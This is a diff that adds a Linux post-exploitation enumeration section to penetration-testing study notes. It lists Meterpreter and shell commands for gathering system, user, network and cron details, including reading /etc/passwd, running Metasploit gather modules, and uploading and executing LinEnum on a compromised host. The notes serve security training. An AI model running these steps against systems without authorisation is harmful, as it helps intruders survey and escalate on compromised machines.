@@ -4,7 +4,7 @@
   - [Network-Based Attacks](#Network-Based-Attacks)
   - The Metasploit Framework (MSF)
   - [Exploitation](#Exploitation)
-  - Post-Exploitation
+  - [Post-Exploitation](#Post-Exploitation)
   - Social Engineering
 
 # SECTION 3 Host and Network Penetration Testing
@@ -341,5 +341,97 @@ exit
 meterpreter > download C:\\Temp\\jaws-enum.txt
 ```
 - JAWS - Just Another Windows Script (https://github.com/411Hall/JAWS)
+
+### Linux Local Enumeration
+```
+meterpreter > sysinfo
+
+hostname
+cat /etc/issue && cat /etc/*release
+uname -a
+uname -r
+env
+lscpu
+free -h
+df -h
+lsblk
+dpkg -l
+cat /etc/shells
+```
+- Enumerating System Information
+
+```
+meterpreter > getuid
+
+id
+cat /etc/passwd
+ls -l /home
+groups
+groups <username>
+who
+w
+last
+lastlog
+```
+- Enumerating Users & Groups
+	- `uid=0` is root
+
+```
+meterpreter > ifconfig
+meterpreter > netstat
+meterpreter > route
+meterpreter > arp
+
+ip a s
+arp -a
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+```
+- Enumerating Network Information
+
+```
+meterpreter > ps
+meterpreter > ps -S <process_name>
+meterpreter > pgrep <process_name>
+
+ps --help all
+ps
+ps aux
+ps aux | grep root
+ps aux | grep <process_name>
+ps aux | grep -i <keyword>
+top
+crontab -l
+crontab -l -u <username>
+ls -al /etc/cron*
+cat /etc/crontab
+cat /etc/cron*
+```
+- Enumerating Processes & Cron Jobs
+
+```
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_system  
+use post/linux/gather/checkvm
+
+cat /root/.msf4/loot/<filename>.txt
+```
+- Automating Linux Local Enumeration
+	- Post-exploitation modules need to `set SESSION <session_id>`
+
+```
+meterpreter > cd /tmp
+meterpreter > upload /root/linenum.sh
+meterpreter > ls
+meterpreter > shell
+
+/bin/bash -i
+chmod +x linenum.sh
+./linenum.sh
+```
+- LinEnum (https://github.com/rebootuser/LinEnum)
 
 ## Social Engineering
